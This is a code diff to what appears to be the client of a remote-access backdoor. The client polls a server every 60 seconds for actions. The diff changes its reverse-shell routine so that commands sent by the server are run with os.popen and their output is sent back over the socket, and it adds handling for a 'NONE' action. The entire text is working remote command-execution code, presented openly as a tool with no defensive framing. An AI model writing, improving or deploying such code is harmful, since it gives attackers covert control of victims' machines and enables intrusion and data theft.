@@ -56,10 +56,12 @@ def checkForActions(client_hashed_id):
 		action = s.recv(1024)
 		if action:
 			if action == "reverse_shell":
-				print("[i] Called for initialize a reverse shell..")
+				print("[S] Called for initialize a reverse shell..")
 				initializeReverseShell(s)
 				s.close()
 				continue
+			elif action == "NONE":
+				print("[i] No action specified for this client. Checking again in 60 seconds.")
 		sleep(60)
 
 
@@ -71,7 +73,8 @@ def initializeReverseShell(s):
 				break
 			else:
 				print("[i] Executing %s" % cmd)
-				os.system(cmd)
+				result = os.popen(cmd).read()
+				s.send(result)
 
 
 def main():
